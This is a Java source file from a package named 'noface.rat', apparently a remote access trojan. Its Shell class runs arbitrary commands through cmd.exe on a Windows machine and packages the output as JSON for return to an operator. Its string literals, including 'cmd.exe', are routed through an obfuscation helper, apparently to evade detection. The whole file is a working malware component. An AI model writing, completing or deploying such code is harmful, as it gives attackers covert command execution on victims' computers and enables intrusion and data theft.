package noface.rat;

import noface.config.S;

import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.TimeUnit;

public final class Shell {

    public static String run(String cmd) {
        if (cmd == null || cmd.isBlank()) {
            return "{\"op\":\"" + S.e("shell.out") + "\",\"err\":\"" + S.e("empty") + "\"}";
        }
        try {
            ProcessBuilder pb = new ProcessBuilder(
                    S.e("cmd.exe"), S.e("/c"), cmd
            );
            pb.redirectErrorStream(true);
            Process p = pb.start();
            boolean ok = p.waitFor(20, TimeUnit.SECONDS);
            byte[] raw;
            try {
                raw = p.getInputStream().readAllBytes();
            } catch (Exception e) {
                raw = new byte[0];
            }
            if (!ok) {
                p.destroyForcibly();
                return "{\"op\":\"" + S.e("shell.out") + "\",\"err\":\"" + S.e("timeout") + "\"}";
            }
            if (raw.length > 200_000) {
                byte[] cut = new byte[200_000];
                System.arraycopy(raw, 0, cut, 0, cut.length);
                raw = cut;
            }
            Charset cs = Charset.defaultCharset();
            if (cs == null) cs = StandardCharsets.UTF_8;
            String text = new String(raw, cs);
            return "{\"op\":\"" + S.e("shell.out") + "\",\"text\":\"" + esc(text) + "\"}";
        } catch (Exception e) {
            return "{\"op\":\"" + S.e("shell.out") + "\",\"err\":\"" + esc(e.getMessage()) + "\"}";
        }
    }

    private static String esc(String s) {
        if (s == null) return "";
        StringBuilder b = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '\\' -> b.append("\\\\");
                case '"' -> b.append("\\\"");
                case '\n' -> b.append("\\n");
                case '\r' -> b.append("\\r");
                case '\t' -> b.append("\\t");
                default -> {
                    if (c < 32) b.append(' ');
                    else b.append(c);
                }
            }
        }
        return b.toString();
    }

    private Shell() {}
}
